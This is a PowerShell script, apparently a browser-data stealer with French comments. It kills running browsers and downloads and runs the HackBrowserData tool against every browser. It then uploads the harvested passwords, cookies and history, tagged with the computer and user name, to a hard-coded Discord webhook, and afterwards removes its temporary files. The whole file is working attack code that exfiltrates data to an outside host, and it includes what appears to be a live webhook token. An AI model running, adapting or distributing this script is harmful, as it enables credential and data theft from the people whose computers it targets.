$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord {
    param([string]$msg)
    try {
        $Body = @{content=$msg} | ConvertTo-Json
        Invoke-RestMethod -Uri $wh -Method Post -Body $Body -ContentType 'application/json' | Out-Null
    } catch {}
}

Send-Discord "🟢 **START** - PC: $env:COMPUTERNAME | User: $env:USERNAME"

# Tuer navigateurs
@("chrome","msedge","firefox","brave","opera","vivaldi") | ForEach-Object {
    Get-Process -Name $_ -EA 0 | Stop-Process -Force -EA 0
}

Start-Sleep 5

Set-Location $env:TEMP
Remove-Item hbd.zip,HBD,results.zip -Recurse -Force -EA 0

Send-Discord "📥 **Downloading HackBrowserData...**"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    # NOUVELLE URL - Version la plus récente
    $url = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.7/hack-browser-data-v0.4.7-windows-amd64.zip"
    
    Invoke-WebRequest -Uri $url -OutFile "hbd.zip" -UseBasicParsing
    
    if (!(Test-Path "hbd.zip")) {
        Send-Discord "❌ **Download failed - file not created**"
        exit
    }
    
    $fileSize = (Get-Item "hbd.zip").Length
    Send-Discord "✅ **Downloaded** - Size: $([math]::Round($fileSize/1KB,2)) KB"
    
    Send-Discord "📦 **Extracting...**"
    Expand-Archive -Path "hbd.zip" -DestinationPath "HBD" -Force
    
    Set-Location "HBD"
    
    if (!(Test-Path "hack-browser-data.exe")) {
        Send-Discord "❌ **EXE not found after extraction**"
        exit
    }
    
    Send-Discord "🔓 **Extracting browser data...**"
    
    Start-Process -FilePath ".\hack-browser-data.exe" -ArgumentList "--browser all --format json --dir output --zip" -Wait -NoNewWindow
    
    Start-Sleep 3
    
    if (Test-Path "results.zip") {
        $size = [math]::Round((Get-Item "results.zip").Length / 1KB, 2)
        Send-Discord "📤 **Uploading $size KB...**"
        
        $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        curl.exe -F "file=@results.zip" -F "content=✅ **DATA EXTRACTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
        
        Send-Discord "✅ **Upload SUCCESS**"
    }
    elseif (Test-Path "output") {
        Send-Discord "⚠️ **Creating manual archive...**"
        
        Compress-Archive -Path "output\*" -DestinationPath "manual.zip" -Force
        
        if (Test-Path "manual.zip") {
            $size = [math]::Round((Get-Item "manual.zip").Length / 1KB, 2)
            curl.exe -F "file=@manual.zip" -F "content=📁 **Fallback data ($size KB)**" $wh
            Send-Discord "✅ **Manual upload done**"
        }
    }
    else {
        Send-Discord "❌ **No output created**"
    }
    
} catch {
    $err = $_.Exception.Message -replace '"',"'" 
    Send-Discord "❌ **Error:** $err"
}

Set-Location ..
Start-Sleep 2
Remove-Item hbd.zip,HBD -Recurse -Force -EA 0

Send-Discord "🧹 **FINISHED**"
